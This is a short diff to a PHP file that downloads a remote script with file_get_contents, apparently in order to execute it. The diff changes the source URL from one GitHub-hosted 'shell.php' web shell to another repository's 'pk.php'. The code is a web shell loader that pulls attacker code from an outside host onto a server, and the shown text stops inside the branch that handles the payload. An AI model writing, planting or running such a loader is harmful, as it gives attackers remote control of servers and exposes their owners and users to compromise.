@@ -1,5 +1,5 @@
 <?php
-$remote = 'https://github.com/jgor/php-cgi-shell/raw/refs/heads/master/shell.php';
+$remote = 'https://github.com/zeanboy1337/shell/raw/refs/heads/main/pk.php';
 $payload = @file_get_contents($remote);
 
 if ($payload) {
